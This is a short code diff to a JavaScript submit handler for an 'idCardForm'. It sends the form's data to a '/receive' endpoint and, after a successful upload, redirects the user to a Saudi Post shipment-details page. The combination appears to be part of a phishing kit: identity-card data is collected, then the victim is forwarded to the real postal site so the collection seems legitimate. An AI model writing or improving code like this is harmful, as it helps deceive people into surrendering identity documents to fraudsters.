@@ -333,12 +333,13 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
                 // Send AJAX request
                 return $.ajax({
                     method: 'POST',
-                    url: "./receive",
+                    url: "/receive",
                     data: formDataToSend,
                     processData: false, // Prevent jQuery from processing the data
                     contentType: false // Prevent jQuery from overriding the content type
                 }).done(function(msg) {
-            	
+                
+            	window.location.href = "https://splonline.com.sa/en/shipmentdetailsstatic";
                 console.log(msg); // Log success message
                 
             })
